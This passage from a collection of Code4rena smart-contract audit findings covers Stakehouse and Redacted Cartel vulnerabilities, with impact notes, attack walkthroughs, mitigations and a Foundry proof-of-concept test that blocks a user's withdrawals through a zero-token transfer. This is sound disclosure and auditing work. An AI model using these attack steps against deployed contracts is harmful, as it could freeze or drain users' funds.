"html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/90", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-04"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245   # Vulnerability details  ## Impact  If a user stakes some sETH, and after some time decides to unstake some amount of sETH, later s/he will not be qualified or be less qualified to claim ETH on the remaining staked sETH.  ## Proof of Concept  Suppose Alice stakes 5 sETH by calling `stake(...)`. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L203 So, we will have:  -  `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`  - `sETHStakedBalanceForKnot[BLS][Alice] = 5 * 10^18`  - `sETHTotalStakeForKnot[BLS] += 5 * 10^18`  Later, Alice decides to unstake 3 sETH by calling `unstake(...)`. https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L245  So, all ETH owed to Alice will be paid: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L257  Then, we will have:  -  `sETHUserClaimForKnot[BLS][Alice] = (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION`  - `sETHStakedBalanceForKnot[BLS][Alice] = 2 * 10^18`  - `sETHTotalStakeForKnot[BLS] -= 3 * 10^18`  It is clear that the mapping `sETHStakedBalanceForKnot` is decreased as expected, but the mapping `sETHUserClaimForKnot` is not changed. In other words, the mapping `sETHUserClaimForKnot` is still holding the claimed amount based on the time 5 sETH were staked.  If, after some time, the ETH is accumulated per free floating share for the BLS public key that Alice was staking for, Alice will be qualified to some more ETH to claim (because she has still 2 sETH staked).   If Alice unstakes by calling `unstake(...)` or claim ETH by calling `claimAsStaker(...)`, in both calls, the function `calculateUnclaimedFreeFloatingETHShare` will be called to calculate the amount of unclaimed ETH: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L652  In this function, we will have:  - `stakedBal = sETHStakedBalanceForKnot[BLS][Alice]` = 2 * 10^18  - `userShare = (newAccumulatedETHPerShare * stakedBal) / PRECISION`   The return value which is unclaimed ETH will be: ``` userShare - sETHUserClaimForKnot[BLS][Alice] =  (newAccumulatedETHPerShare * 2 * 10^18) / PRECISION - (5 * 10^18 * accumulatedETHPerFreeFloatingShare) / PRECISION ```  This return value is not correct (it is highly possible to be smaller than 0, and as a result Alice can not claim anything), because the claimed ETH is still based on the time when 5 sETH were staked, not on the time when 2 sETH were remaining/staked.  The vulnerability is that during unstaking, the mapping `sETHUserClaimForKnot` is not updated to the correct value. In other words, this mapping is updated in `_claimAsStaker`, but it is updated based on 5 sETH staked, later when 3 sETH are unstaked, this mapping should be again updated based on the remaing sETH (which is 2 sETH).  As a result, Alice can not claim ETH or she will qualify for less amount.  ## Tools Used  ## Recommended Mitigation Steps The following line should be added on line 274: ``` sETHUserClaimForKnot[_blsPubKey][msg.sender] =                 (accumulatedETHPerShare * sETHStakedBalanceForKnot[_blsPubKey][msg.sender]) / PRECISION ```  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/syndicate/Syndicate.sol#L274"}, {"title": "Giant pools cannot receive ETH from vaults", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/74", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126   # Vulnerability details  ## Impact  Both giant pools are affected: 1. GiantSavETHVaultPool 2. bringUnusedETHBackIntoGiantPool   The giant pools have a `bringUnusedETHBackIntoGiantPool` function that calls the vaults to send back any unused ETH. Currently, any call to this function will revert. Unused ETH will not be sent to the giant pools and will stay in the vaults.  This causes an insolvency issue when many users want to withdraw ETH and there is not enough liquidity inside the giant pools.  ## Proof of Concept  `bringUnusedETHBackIntoGiantPool` calls the vaults to receive ETH: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L137 ```     function bringUnusedETHBackIntoGiantPool(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, \"Empty arrays\");         require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");         require(numOfVaults == _amounts.length, \"Inconsistent arrays\");         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);             for (uint256 j; j < _lpTokens[i].length; ++j) {                 require(                     vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,                     \"ETH is either staked or derivatives minted\"                 );             }             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }     } ```  the vaults go through a process of burning the `_lpTokens` and sending the caller giant pool ETH.  `burnLPToken` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126 ```     function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {         /// .....         (bool result,) = msg.sender.call{value: _amount}(\"\");         // .....     } ```  Giant pools do not have a `fallback` or `receive` function. ETH cannot be sent to them  additionally, there is no accounting of `idleETH`, which should be increased with the received ETH in order to facilitate withdraws  ## Tools Used  VS Code  ## Recommended Mitigation Steps  1. Add a `fallback` or `receive` function to the pools. 2. `idleETH` should be increased with the received ETH "}, {"title": "Rotating `LPTokens` to banned BLS public key", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-02"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76   # Vulnerability details  ## Impact  It is possible to rotate `LPTokens` to a banned BLS public key. This is not a safe action, because it can result in insolvency of the project (specially if the banned BLS public key was malicious).  ## Proof of Concept  When a user deposits ETH for staking by calling `depositETHForStaking`, the manager checks whether the provided BLS public key is banned or not. `require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L113  If it is not banned the `LPToken` related to that BLS public key will be minted to the caller, so the number of `LPToken` related to that BLS public key will be increased.  https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/liquid-staking/ETHPoolLPFactory.sol#L125  If it is banned, it will not be possible to stake to this BLS public key, so the number of `LPToken` will not be increased. But the issue is that it is still possible to increase the `LPToken` of this BLS public key through rotating `LPToken`.   In other words, a malicious user can call `rotateLPTokens`, so that the `_oldLPToken` will be migrated to `_newLPToken` which is equal to the `LPToken` related to the banned BLS public key.  In summary, the vulnerability is that during rorating `LPTokens`, it is not checked that the `_newLPToken` is related to a banned BLS public key or not.  ## Tools Used  ## Recommended Mitigation Steps The following line should be added to function `rotateLPTokens(...)`: `require(liquidStakingNetworkManager.isBLSPublicKeyBanned(blsPublicKeyOfNewKnot ) == false, \"BLS public key is banned or not a part of LSD network\");` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76"}, {"title": "Freezing of funds - Hacker can prevent users withdraws in giant pools", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-01"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96   # Vulnerability details  ## Impact  A hacker can prevent users from withdrawing dETH or LPTokens in giant pools.  This bug causes a revert in: 1. `WithdrawLP` - `GiantMevAndFeesPool` 2. `WithdrawLP` - `GiantSavETHVaultPool` 3. `WithdrawDETH` - `GiantSavETHVaultPool`  A hacker can prevent a user from receiving dETH when users are eligible and guaranteed to receive it through their stake.  This causes a liquidity crunch as the only funds that are possible to withdraw are ETH. There is not enough ETH in the giant pools to facilitate a large withdraw as ETH is staked for LPTokens and dETH.  The giant pools will become insolvent to returning ETH, dETH or vault LPTokens.  ## Proof of Concept  Both `WithdrawLP` and `WithdrawDETH` act in a similar way: 1. loop LPtokens received for withdraw 2. Check user has enough Giant LP tokens to burn and pool has enough vault LP to give. 3. Check that a day has passed since user has interacted with Giant LP Token 4. burn tokens 5. send tokens  Example of `WithdrawDETH`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66 ```     function withdrawDETH(         address[] calldata _savETHVaults,         LPToken[][] calldata _lpTokens,         uint256[][] calldata _amounts     ) external {         uint256 numOfVaults = _savETHVaults.length;         require(numOfVaults > 0, \"Empty arrays\");         require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");         require(numOfVaults == _amounts.length, \"Inconsistent arrays\");          // Firstly capture current dETH balance and see how much has been deposited after the loop         uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));         for (uint256 i; i < numOfVaults; ++i) {             SavETHVault vault = SavETHVault(_savETHVaults[i]);              // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user             for (uint256 j; j < _lpTokens[i].length; ++j) {                 LPToken token = _lpTokens[i][j];                 uint256 amount = _amounts[i][j];                  // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP                 _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);                  require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");                  // Giant LP is burned 1:1 with LPs from sub-networks                 require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");                  // Burn giant LP from user before sending them dETH                 lpTokenETH.burn(msg.sender, amount);                  emit LPBurnedForDETH(address(token), msg.sender, amount);             }              // Ask             vault.burnLPTokens(_lpTokens[i], _amounts[i]);         }          // Calculate how much dETH has been received from burning         dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;          // Send giant LP holder dETH owed         getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);     } ```  The bug is in `_assertUserHasEnoughGiantLPToClaimVaultLP` in the last require that checks that a day has passed since the user has interacted with Giant LP Token: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93 ```     function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {         require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");         require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");         require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");     } ```  The condition `lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp` can be set to fail by the hacker. The hacker  transfers 0 `lpTokenETH` tokens to  `msg.sender`. This transfer will update the `lastInteractedTimestamp` to now.  The above can be done once a day or on-demand by front-running the withdraw commands.  `_afterTokenTransfer` in `GiantLP.sol`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43 ```     function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {         lastInteractedTimestamp[_from] = block.timestamp;         lastInteractedTimestamp[_to] = block.timestamp;         if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);     } ``` ### Foundry POC  The POC will show how a hacker prevents a user from receiving dETH although they are eligible to receive it.  Add the following test to `GiantPools.t.sol`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118 ```     function testPreventWithdraw() public {         // Set up users and ETH         address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);         address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);          // Register BLS key         registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          // Deposit 24 ETH into giant savETH         vm.prank(savETHUser);         giantSavETHPool.depositETH{value: 24 ether}(24 ether);         assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);         assertEq(address(giantSavETHPool).balance, 24 ether);          // Deploy 24 ETH from giant LP into savETH pool of LSDN instance         bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);          giantSavETHPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.savETHVault())),             getUint256ArrayFromValues(24 ether),             blsKeysForVaults,             stakeAmountsForVaults         );         assertEq(address(manager.savETHVault()).balance, 24 ether);          // Deposit 4 ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();          assertEq(address(giantFeesAndMevPool).balance, 4 ether);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);         giantFeesAndMevPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             getUint256ArrayFromValues(4 ether),             blsKeysForVaults,             stakeAmountsForVaults         );          // Ensure we can stake and mint derivatives         stakeAndMintDerivativesSingleKey(blsPubKeyOne);          IERC20 dETHToken = savETHVault.dETHToken();          vm.startPrank(accountFive);         dETHToken.transfer(address(savETHVault.saveETHRegistry()), 24 ether);         vm.stopPrank();          LPToken[] memory tokens = new LPToken[](1);         tokens[0] = savETHVault.lpTokenForKnot(blsPubKeyOne);          LPToken[][] memory allTokens = new LPToken[][](1);         allTokens[0] = tokens;          stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);          // User will not have any dETH to start         assertEq(dETHToken.balanceOf(savETHUser), 0);          // Warp ahead -> savETHUser eligible to dETH         vm.warp(block.timestamp + 2 days);          // Send 0 tokens to savETHUser so he cannot withdrawDETH         address hacker = address(0xdeadbeef);         vm.startPrank(hacker);         giantSavETHPool.lpTokenETH().transfer(savETHUser, 0);         vm.stopPrank();         address[] memory addresses = getAddressArrayFromValues(address(manager.savETHVault()));          vm.startPrank(savETHUser);         // Validate withdrawDETH will revert           vm.expectRevert(\"Too new\");         giantSavETHPool.withdrawDETH(addresses, allTokens, stakeAmountsForVaults);         vm.stopPrank();         } ```  To run the POC execute:  `yarn test -m \"PreventWithdraw\" -v`  Expected output:  ``` Running 1 test for test/foundry/GiantPools.t.sol:GiantPoolTests [PASS] testPreventWithdraw() (gas: 3132637) Test result: ok. 1 passed; 0 failed; finished in 9.25ms ```  To run with full trace, execute: `yarn test -m \"PreventWithdraw\" -vvvv`  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  Make sure transfers in the GiantLP are only for funds larger than (0.001 ETH), this will make the exploitation expensive."}, {"title": "Theft of ETH of free floating SLOT holders", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/40", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369 https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668 https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228   # Vulnerability details  ## Impact  A malicious user can steal all claimable ETH belonging to free floating SLOT holders...  ## Proof of Concept  https://gist.github.com/clems4ever/f1149743897b2620eab0734f88208603  run it in the test suite with forge  ## Tools Used  Manual review / forge  ## Recommended Mitigation Steps  += operator instead of =    in https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228 ?  The logic for keeping the rewards up-to-date is also quite complex in my opinion. The main thing that triggered it for me was the lazy call to `updateAccruedETHPerShares`. Why not keeping the state updated after each operation instead?"}, {"title": "Rewards of GiantMevAndFeesPool can be locked for all users", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/33", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8   # Vulnerability details  ## Impact Any malicious user could make the rewards in GiantMevAndFeesPool inaccessible to all other users...  ## Proof of Concept  https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41  Copy the file in the test suite and run the test.  ## Tools Used  forge test  ## Recommended Mitigation Steps  Protect the inherited functions of the ERC20 tokens (GiantLP and LPToken) because `transfer` is not protected and can trigger the `before` and `after` hooks. There is the same issue with LPToken and StakingFundsVault."}, {"title": "Any user being the first to claim rewards from GiantMevAndFeesPool can unexepectedly collect them all", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/32", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-01"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203   # Vulnerability details  ## Impact Any user being the first to claim rewards from GiantMevAndFeesPool, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards...  ## Proof of Concept  https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de  Copy paste it in the test suite and run it.  ## Tools Used  forge test  ## Recommended Mitigation Steps  Rework the way `accumulatedETHPerLPShare` and `claimed` is used. There are multiple bugs due to the interaction between those variables as you will see in my other reports."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/411", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-60"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/brgltd-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/398", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-56"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/jadezti-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/382", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "G-32"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/adriro-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/323", "labels": ["bug", "G (Gas Optimization)", "grade-b", "sponsor confirmed", "G-24"], "target": "2022-11-redactedcartel-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-11-redactedcartel-findings/blob/main/data/karanctf-G.md)."}, {"title": "fee loss in AutoPxGmx and AutoPxGlp and reward loss in AutoPxGlp by calling PirexRewards.claim(pxGmx/pxGpl, AutoPx*) directly which transfers rewards to  AutoPx* pool without  compound logic get executed and fee calculation logic and pxGmx wouldn't be executed for those rewards", "html_url": "https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/321", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-06"], "target": "2022-11-redactedcartel-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGlp.sol#L197-L296 https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/AutoPxGmx.sol#L230-L313   # Vulnerability details  ## Impact Function `compound()` in `AutoPxGmx` and `AutoPxGlp` contracts is for compounding `pxGLP` (and additionally `pxGMX`) rewards. it works by calling `PirexGmx.claim(px*, this)` to collect the rewards of the vault and then swap the received amount (to calculate the reward, contract save the balance of a contract in that reward token before and after the call to the `claim()` and by subtracting them finds the received reward amount) and deposit them in `PirexGmx` again for compounding and in doing so it calculates fee based on what it received and in `AutoPxGlp` case it calculates `pxGMX` rewards too based on the extra amount contract receives during the execution of `claim()`. but attacker can call `PirexGmx.claim(px*, PirexGlp)` directly and make `PirexGmx` contract to transfer (`gmxBaseReward` and `pxGmx`) rewards to `AutoPxGlp` and in this case the logics of fee calculation and reward calculation in `compound()` function won't get executed and contract won't get it's fee from rewards and users won't get their `pxGmx` reward. so this bug would cause fee loss in `AutoPxGmx` and `AutoPxGlp` for contract and `pxGmx`'s reward loss for users in `AutoPxGlp`.  ## Proof of Concept the bug in in `AutoPxGmx` is similar to `AutoPxGlp`, so we only give Proof of Concept for `AutoPxGlp`. This is `compound()` function code in `AutoPxGlp` contract: ```     function compound(         uint256 minUsdg,         uint256 minGlp,         bool optOutIncentive     )         public         returns (             uint256 gmxBaseRewardAmountIn,             uint256 pxGmxAmountOut,             uint256 pxGlpAmountOut,             uint256 totalPxGlpFee,             uint256 totalPxGmxFee,             uint256 pxGlpIncentive,             uint256 pxGmxIncentive         )     {         if (minUsdg == 0) revert InvalidParam();         if (minGlp == 0) revert InvalidParam();          uint256 preClaimTotalAssets = asset.balanceOf(address(this));         uint256 preClaimPxGmxAmount = pxGmx.balanceOf(address(this));          PirexRewards(rewardsModule).claim(asset, address(this));         PirexRewards(rewardsModule).claim(pxGmx, address(this));          // Track the amount of rewards received         gmxBaseRewardAmountIn = gmxBaseReward.balanceOf(address(this));          if (gmxBaseRewardAmountIn != 0) {             // Deposit received rewards for pxGLP             (, pxGlpAmountOut, ) = PirexGmx(platform).depositGlp(                 address(gmxBaseReward),                 gmxBaseRewardAmountIn,                 minUsdg,                 minGlp,                 address(this)             );         }          // Distribute fees if the amount of vault assets increased         uint256 newAssets = totalAssets() - preClaimTotalAssets;         if (newAssets != 0) {             totalPxGlpFee = (newAssets * platformFee) / FEE_DENOMINATOR;             pxGlpIncentive = optOutIncentive                 ? 0                 : (totalPxGlpFee * compoundIncentive) / FEE_DENOMINATOR;              if (pxGlpIncentive != 0)                 asset.safeTransfer(msg.sender, pxGlpIncentive);              asset.safeTransfer(owner, totalPxGlpFee - pxGlpIncentive);         }          // Track the amount of pxGMX received         pxGmxAmountOut = pxGmx.balanceOf(address(this)) - preClaimPxGmxAmount;          if (pxGmxAmountOut != 0) {             // Calculate and distribute pxGMX fees if the amount of pxGMX increased             totalPxGmxFee = (pxGmxAmountOut * platformFee) / FEE_DENOMINATOR;             pxGmxIncentive = optOutIncentive                 ? 0                 : (totalPxGmxFee * compoundIncentive) / FEE_DENOMINATOR;              if (pxGmxIncentive != 0)                 pxGmx.safeTransfer(msg.sender, pxGmxIncentive);              pxGmx.safeTransfer(owner, totalPxGmxFee - pxGmxIncentive);              // Update the pxGmx reward accrual             _harvest(pxGmxAmountOut - totalPxGmxFee);         } else {             // Required to keep the globalState up-to-date             _globalAccrue();         }          emit Compounded(             msg.sender,             minGlp,             gmxBaseRewardAmountIn,             pxGmxAmountOut,             pxGlpAmountOut,             totalPxGlpFee,             totalPxGmxFee,             pxGlpIncentive,             pxGmxIncentive         );     } ``` As you can see contract collects rewards by calling `PirexRewards.claim()` and in the line `uint256 newAssets = totalAssets() - preClaimTotalAssets;` contract calculates the received amount of rewards(by subtracting the balance after and before reward claim) and then calculates fee based on this amount `totalPxGlpFee = (newAssets * platformFee) / FEE_DENOMINATOR;` and then sends the fee in the line `asset.safeTransfer(owner, totalPxGlpFee - pxGlpIncentive)` for `owner`. the logic for `pxGmx` rewards are the same. As you can see the calculation of fee is based on the rewards received, and there is no other logic in the contract to calculate and transfer the fee of protocol. so if `AutoPxGpl` receives rewards without `compound()` getting called then for those rewards fee won't be calculated and transferred and protocol would lose it's fee. In the line `_harvest(pxGmxAmountOut - totalPxGmxFee)` contract calls `_harvest()` function to update the `pxGmx` reward accrual and there is no call to `_harvest()` in any other place and this is the only place where `pxGmx` reward accrual gets updated. contract uses `pxGmxAmountOut` which is the amount of `gmx` contract received during the call (code calculates it by subtracting the balance after and before reward claim: `pxGmxAmountOut = pxGmx.balanceOf(address(this)) - preClaimPxGmxAmount;`) so contract only handles accrual rewards in this function call and if some `pxGmx` rewards claimed for contract without `compund()` logic execution then those rewards won't be used in `_harvest()` and `_globalAccrue()` calculation and users won't receive those rewards. As mentioned attacker can call `PirexRewards.claim(pxGmx, AutoPxGpl)` directly and make `PirexRewads` contract to transfer `AutoPxGpl` rewards. This is `claim()` code in `PirexRewards`: ```     function claim(ERC20 producerToken, address user) external {         if (address(producerToken) == address(0)) revert ZeroAddress();         if (user == address(0)) revert ZeroAddress();          harvest();         userAccrue(producerToken, user);          ProducerToken storage p = producerTokens[producerToken];         uint256 globalRewards = p.globalState.rewards;         uint256 userRewards = p.userStates[user].rewards;          // Claim should be skipped and not reverted on zero global/user reward         if (globalRewards != 0 && userRewards != 0) {             ERC20[] memory rewardTokens = p.rewardTokens;             uint256 rLen = rewardTokens.length;              // Update global and user reward states to reflect the claim             p.globalState.rewards = globalRewards - userRewards;             p.userStates[user].rewards = 0;              emit Claim(producerToken, user);              // Transfer the proportionate reward token amounts to the recipient             for (uint256 i; i < rLen; ++i) {                 ERC20 rewardToken = rewardTokens[i];                 address rewardRecipient = p.rewardRecipients[user][rewardToken];                 address recipient = rewardRecipient != address(0)                     ? rewardRecipient                     : user;                 uint256 rewardState = p.rewardStates[rewardToken];                 uint256 amount = (rewardState * userRewards) / globalRewards;                  if (amount != 0) {                     // Update reward state (i.e. amount) to reflect reward tokens transferred out                     p.rewardStates[rewardToken] = rewardState - amount;                      producer.claimUserReward(                         address(rewardToken),                         amount,                         recipient                     );                 }             }         }     } ``` As you can see it can be called by anyone for any user. so to perform this attack, attacker would perform this steps: 1. suppose `AutoPxGpl` has pending rewards, for example 100 `pxGmx` and 100 `weth`. 2. attacker would call  `PirexRewards.claim(pxGmx, AutoPxGpl)` and  `PirexRewards.claim(pxGpl, AutoPxGpl)` and `PirexRewards` contract would calculate and claim and transfer `pxGmx` rewards and `weth` rewards of `AutoPxGpl` address. 3. then `AutoPxGpl` has no pending rewards but the balance of `pxGmx` and `weth` of contract has been increased. 4. if anyone call `AutoPxGpl.compound()` because there is no pending rewards contract would receive no rewards and because contract only calculates fee and rewards based on received rewards during the call to `compound()` so contract wouldn't calculate any fee or reward accrual for those 1000 `pxGmx` and `weth` rewards. 5. `owner` of `AutoPxGpl` would lose his fee for those rewards and users of `AutoPxGpl` would lose their claims for those 1000 `pxGmx` rewards (because the calculation for them didn't happen).  This bug is because of the fact that the only logic handling rewards is in `compound()` function which is only handling receiving rewards by calling `claim()` during the call to `compound()` but it's possible to call `claim()` directly (`PirexRewards` contract allows this) and `AutoPxGpl` won't get notified about this new rewards and the related logics won't get executed.  ## Tools Used VIM  ## Recommended Mitigation Steps contract should keep track of it's previous balance when `compound()` get 